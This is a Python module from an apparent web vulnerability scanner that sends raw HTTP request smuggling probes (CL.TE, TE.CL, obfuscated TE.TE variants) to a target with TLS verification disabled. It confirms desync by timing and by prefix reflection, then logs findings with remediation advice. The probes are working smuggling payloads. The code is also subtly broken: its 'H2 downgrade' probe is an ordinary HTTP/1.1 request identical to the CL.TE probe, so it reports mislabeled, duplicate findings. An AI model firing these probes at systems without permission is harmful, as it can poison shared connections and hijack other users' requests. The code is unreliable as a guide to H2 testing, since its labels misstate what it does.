"""HTTP Request Smuggling — CL.TE, TE.CL, TE.TE obfuscation, H2 downgrade, response-based confirmation."""
from __future__ import annotations
import asyncio
import socket
import ssl
import time
from typing import Any
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

SMUGGLING_PREFIX = "TLSM_SMUGGLED"


def _build_cl_te_probe(host: str, path: str = "/") -> bytes:
    """CL.TE: frontend uses CL, backend uses TE (chunked)."""
    prefix = SMUGGLING_PREFIX.encode()
    body = b"0\r\n\r\n" + prefix + b"\r\n"
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body) + 1}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode() + body


def _build_te_cl_probe(host: str, path: str = "/") -> bytes:
    """TE.CL: frontend uses TE, backend uses CL."""
    chunk = b"1\r\nG\r\n0\r\n\r\n"
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode() + chunk


def _build_te_te_variants(host: str, path: str = "/") -> list[tuple[str, bytes]]:
    """TE.TE: obfuscated TE headers — one server ignores, the other processes."""
    prefix = SMUGGLING_PREFIX.encode()
    body = b"0\r\n\r\n" + prefix + b"\r\n"
    base_len = len(body) + 1
    variants = []

    # Double TE header
    variants.append(("double_te", (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {base_len}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode() + body))

    # Tab-separated TE value
    variants.append(("tab_te", (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {base_len}\r\n"
        f"Transfer-Encoding:\tchunked\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode() + body))

    # Comma-separated TE list (chunked, identity)
    variants.append(("list_te", (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {base_len}\r\n"
        f"Transfer-Encoding: chunked, identity\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode() + body))

    # TE with trailing whitespace
    variants.append(("trailing_te", (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {base_len}\r\n"
        f"Transfer-Encoding: chunked \r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode() + body))

    # TE with uppercase
    variants.append(("uppercase_te", (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {base_len}\r\n"
        f"TRANSFER-ENCODING: chunked\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode() + body))

    return variants


def _build_h2_downgrade_probe(host: str, path: str = "/") -> bytes:
    """H2 downgrade: inject CL into HTTP/2 request that gets downgraded to HTTP/1.1."""
    prefix = SMUGGLING_PREFIX.encode()
    body = b"0\r\n\r\n" + prefix + b"\r\n"
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body) + 1}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode() + body


async def _raw_send(host: str, port: int, use_tls: bool, data: bytes, timeout: int = 10) -> bytes:
    loop = asyncio.get_event_loop()
    def _sync_send() -> bytes:
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            if use_tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.sendall(data)
            response = b""
            sock.settimeout(timeout)
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                pass
            sock.close()
            return response
        except Exception as e:
            return f"ERROR: {e}".encode()
    return await loop.run_in_executor(None, _sync_send)


async def _detect_timing_differential(
    host: str, port: int, use_tls: bool, probe: bytes
) -> tuple[bool, float, bytes]:
    start = time.monotonic()
    response = await _raw_send(host, port, use_tls, probe, timeout=8)
    elapsed = time.monotonic() - start
    return elapsed > 5.0, elapsed, response


async def _confirm_smuggling(
    host: str, port: int, use_tls: bool, technique: str, probe: bytes
) -> dict[str, Any]:
    """Send probe twice — if the prefix appears in the *second* response, smuggling confirmed."""
    result: dict[str, Any] = {"confirmed": False, "evidence": "", "timing_differential": False}

    # First: timing-based detection
    timing_hit, elapsed, first_resp = await _detect_timing_differential(host, port, use_tls, probe)
    result["timing_differential"] = timing_hit
    result["first_response"] = first_resp[:200].decode("utf-8", errors="replace")

    if timing_hit and b"ERROR" not in first_resp:
        # Second: send two requests back-to-back — the smuggled prefix should pollute the second
        normal_get = (
            f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
        ).encode()
        combined = probe + normal_get
        combined_resp = await _raw_send(host, port, use_tls, combined, timeout=8)
        resp_text = combined_resp.decode("utf-8", errors="replace")
        result["combined_response"] = resp_text[:500]

        if SMUGGLING_PREFIX in resp_text or SMUGGLING_PREFIX.lower() in resp_text.lower():
            result["confirmed"] = True
            result["evidence"] = f"Smuggled prefix '{SMUGGLING_PREFIX}' found in second response"
        elif timing_hit:
            result["evidence"] = f"Timing differential ({elapsed:.1f}s) suggests {technique} desync"

    return result


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    url = target if "://" in target else f"https://{target}"
    use_tls = url.startswith("https://")
    host_part = url.split("://")[1].split("/")[0]
    host = host_part.split(":")[0]
    port = int(host_part.split(":")[1]) if ":" in host_part else (443 if use_tls else 80)
    path = "/" + "/".join(url.split("://")[1].split("/")[1:]) or "/"

    console.print(f"\n[module][+] HTTP Request Smuggling v2[/module] -> [target]{url}[/target]")
    findings: list[dict[str, Any]] = []

    # -- 1. CL.TE -------------------------------------------------------------------
    console.print("  Testing CL.TE (frontend CL, backend TE)...")
    cl_te_probe = _build_cl_te_probe(host, path)
    cl_te_result = await _confirm_smuggling(host, port, use_tls, "CL.TE", cl_te_probe)
    if cl_te_result["confirmed"] or cl_te_result["timing_differential"]:
        severity = "critical" if cl_te_result["confirmed"] else "high"
        title = f"HTTP Request Smuggling — CL.TE{' (confirmed)' if cl_te_result['confirmed'] else ' (timing oracle)'}"
        print_finding(title, severity, url)
        findings.append({"technique": "CL.TE", **cl_te_result})
        if session:
            await session.add_finding(
                target=url, module="smuggling",
                vuln_type="http_smuggling_cl_te",
                severity=severity, confidence="confirmed" if cl_te_result["confirmed"] else "likely",
                title=title,
                description=f"CL.TE desync detected. Frontend uses Content-Length, backend parses Transfer-Encoding: chunked. {'Confirmed via prefix reflection.' if cl_te_result['confirmed'] else 'Timing oracle suggests backend is waiting for more data.'}",
                evidence=cl_te_result.get("evidence", ""),
                reproduction="Send a POST with both CL and TE headers where CL is short and the chunked body overflows.",
                remediation="1. Reject requests with both Content-Length and Transfer-Encoding. 2. Use HTTP/2 end-to-end. 3. Normalize TE headers at the proxy.",
                cvss_score=9.8, cwe="CWE-444",
            )

    # -- 2. TE.CL -------------------------------------------------------------------
    console.print("  Testing TE.CL (frontend TE, backend CL)...")
    te_cl_probe = _build_te_cl_probe(host, path)
    te_cl_result = await _confirm_smuggling(host, port, use_tls, "TE.CL", te_cl_probe)
    if te_cl_result["confirmed"] or te_cl_result["timing_differential"]:
        severity = "critical" if te_cl_result["confirmed"] else "high"
        title = f"HTTP Request Smuggling — TE.CL{' (confirmed)' if te_cl_result['confirmed'] else ' (timing oracle)'}"
        print_finding(title, severity, url)
        findings.append({"technique": "TE.CL", **te_cl_result})
        if session:
            await session.add_finding(
                target=url, module="smuggling",
                vuln_type="http_smuggling_te_cl",
                severity=severity, confidence="confirmed" if te_cl_result["confirmed"] else "likely",
                title=title,
                description=f"TE.CL desync detected. Frontend uses Transfer-Encoding, backend parses Content-Length. {'Confirmed via prefix reflection.' if te_cl_result['confirmed'] else 'Timing oracle suggests the backend is waiting for more data.'}",
                evidence=te_cl_result.get("evidence", ""),
                remediation="1. Reject requests with both CL and TE. 2. Use HTTP/2 end-to-end. 3. Configure frontend to prefer TE over CL.",
                cvss_score=9.8, cwe="CWE-444",
            )

    # -- 3. TE.TE obfuscation variants -----------------------------------------------
    console.print("  Testing TE.TE obfuscation variants...")
    te_te_variants = _build_te_te_variants(host, path)
    for variant_name, variant_probe in te_te_variants:
        v_result = await _confirm_smuggling(host, port, use_tls, f"TE.TE ({variant_name})", variant_probe)
        if v_result["confirmed"] or v_result["timing_differential"]:
            severity = "critical" if v_result["confirmed"] else "high"
            title = f"HTTP Request Smuggling — TE.TE ({variant_name}){' (confirmed)' if v_result['confirmed'] else ' (timing oracle)'}"
            print_finding(title, severity, url)
            findings.append({"technique": f"TE.TE_{variant_name}", **v_result})
            if session:
                await session.add_finding(
                    target=url, module="smuggling",
                    vuln_type=f"http_smuggling_te_te_{variant_name}",
                    severity=severity, confidence="confirmed" if v_result["confirmed"] else "likely",
                    title=title,
                    description=f"TE.TE obfuscation ({variant_name}) desync detected. One server processes the obfuscated TE header while the other ignores it.",
                    evidence=v_result.get("evidence", ""),
                    remediation="1. Normalize Transfer-Encoding headers to a canonical form. 2. Reject malformed TE headers. 3. Use a single trusted parser.",
                    cvss_score=9.8, cwe="CWE-444",
                )

    # -- 4. H2 downgrade smuggling ---------------------------------------------------
    console.print("  Testing H2 downgrade smuggling...")
    h2_probe = _build_h2_downgrade_probe(host, path)
    h2_result = await _confirm_smuggling(host, port, use_tls, "H2 downgrade", h2_probe)
    if h2_result["confirmed"] or h2_result["timing_differential"]:
        severity = "critical" if h2_result["confirmed"] else "high"
        title = f"HTTP Request Smuggling — H2 Downgrade{' (confirmed)' if h2_result['confirmed'] else ' (timing oracle)'}"
        print_finding(title, severity, url)
        findings.append({"technique": "H2_downgrade", **h2_result})
        if session:
            await session.add_finding(
                target=url, module="smuggling",
                vuln_type="http_smuggling_h2_downgrade",
                severity=severity, confidence="confirmed" if h2_result["confirmed"] else "likely",
                title=title,
                description="HTTP/2 to HTTP/1.1 downgrade smuggling detected. Frontend downgrades H2 to H1.1 but fails to sanitize conflicting Content-Length headers.",
                evidence=h2_result.get("evidence", ""),
                remediation="1. Use HTTP/2 end-to-end without downgrade. 2. Sanitize headers during protocol translation. 3. Strip Content-Length from H2 requests.",
                cvss_score=9.8, cwe="CWE-444",
            )

    console.print(f"  Smuggling scan complete — {len(findings)} issues")
    return {"target": url, "findings": findings, "count": len(findings)}
